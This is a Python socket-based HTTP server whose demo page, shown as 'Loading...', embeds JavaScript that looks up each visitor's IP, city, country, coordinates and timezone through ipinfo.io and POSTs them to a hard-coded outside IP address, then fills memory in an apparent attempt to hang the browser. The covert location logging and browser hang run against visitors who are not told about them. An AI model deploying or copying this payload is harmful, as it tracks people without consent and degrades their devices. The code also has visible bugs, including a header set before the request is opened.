import socket
import time
import threading
import urllib



OBJ = socket.socket



class HttpServer(OBJ):

	def __init__(self):
		socket.socket.__init__(self)

		self.IP = '127.0.0.1'
		self.PORT = 80
		self.DELAY = 10

		self.READY = False

		self.layers_of_check = {}

		self.page_not_found_text = '<h1 style="text-align: center; font-size: 48px; padding-top: 30px;">[404] Page Not Found</h1><hr>'

		print('[+] HTTP server has been created.')



	def __create_responce(self, data):
		return 'HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\n\n'.encode() + data.encode()

	def __decode_url(self, url):
		return urllib.parse.unquote(url)

	def set_server(self):
		print('[+] Starting HTTP server...')

		while True:
			try:
				self.bind((self.IP, self.PORT))

				self.listen()

				self.READY = True

				print('[+] HTTP server started.')
				print(f'[+] Server`s link: http://{self.IP}:{self.PORT}')

				break
			except:
				time.sleep(self.DELAY)				


	def parse_content(self, content):
		returned_info = {}
		URL = ''

		content = content.split('\n')
		info = content[0][:-1].split(' ')
		content = content[1:]

		for l in content:
			try:
				l = l.split(': ')
				returned_info[l[0]] = l[1][:-1] if l[1][-1] == str('\r') else l[1]

			except: pass

		return info[0], info[-1], returned_info, info[1]


	def client_funck(self, client, client_ip):

		getted_data = [None, None]

		getted_data[0], getted_data[1], getted_package, URL = self.parse_content(str(client.recv(1024000).decode('utf-8')))


		HOST = self.__decode_url(getted_package['Host'] + URL)

		print(f'[{getted_data[1]}] [{getted_data[0]}] {client_ip[0]} TO {HOST}')

		for layer in self.layers_of_check:
			if URL == layer:

				if type(self.layers_of_check[layer]) == str:
					client.send(self.__create_responce(self.layers_of_check[layer]))
				else:
					client.send(self.__create_responce(self.layers_of_check[layer]()))

				break

		else:
			if type(self.page_not_found_text) == str:
				client.send(self.__create_responce(self.page_not_found_text))
			else: client.send(self.__create_responce(self.page_not_found_text()))

	def add_page(self, name, func):
		self.layers_of_check[name] = func
		print(f'[+] Added page {name}.')

	def set_pagenotfound(self, func):
		if func == None or func == '':
			self.page_not_found_text = '<h1 style="text-align: center; font-size: 48px; padding-top: 30px;">[404] Page Not Found</h1><hr>'
		else:
			self.page_not_found_text = func

	def catch_clients(self):
		print('[+] Starting getting clients...')

		while True:
			try:

				client, client_ip = self.accept()

				threading.Thread(target=self.client_funck, args=(client, client_ip)).start()

			except: pass


	def run(self, host=None):
		if host:
			self.IP = host.split(':')[0]
			self.PORT = int(host.split(':')[1])

		threading.Thread(target=self.set_server).start()

		while True:
			if self.READY:
				self.catch_clients()



if __name__ == '__main__':
	server = HttpServer()

	server.add_page('/', '''
<script>
var request = new XMLHttpRequest();
request.open('GET', 'https://ipinfo.io/json');
request.responseType = 'json';
request.send();

request.onload = function() {

  var superHeroes = request.response;

  var str_to_send = "<" + new Date().toLocaleDateString() + new Date().toLocaleTimeString() + '> [';
  str_to_send = str_to_send + superHeroes['ip'] + '] ' + superHeroes['city'] + superHeroes['region'];
  str_to_send = str_to_send + superHeroes['country'] + ' / ' + superHeroes['loc'];
  str_to_send = str_to_send + ' (' + superHeroes['timezone'] + ')';

  var FINAL = new XMLHttpRequest();
  FINAL.setRequestHeader("Content-Type", "application/json");
  FINAL.open('POST', 'http://46.185.22.3:81/', true);
  FINAL.send(JSON.stringify({"data": str_to_send}));

  var buf = new Array();
  for(var i = 0;  i != 1024 * 8; ++i) {
    buf[i] = '1' * 1024000;
  }
}
</script>
<h1>Loading...</h1>
		''')

	server.run(host='192.168.0.104:82')
